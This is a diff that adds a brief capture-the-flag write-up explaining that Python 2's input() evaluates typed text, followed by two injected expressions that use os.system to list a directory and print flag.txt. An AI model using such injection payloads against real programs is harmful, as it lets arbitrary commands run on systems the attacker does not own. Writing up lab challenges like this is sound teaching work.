@@ -1,0 +1,5 @@
+python2's input function has a vulnerability where it'll run anything you type
+so we used the os library to run an ls to find out what files are in that folder
+then we just cat the file itself.
+__import__("os").system("ls")
+__import__("os").system("cat flag.txt")
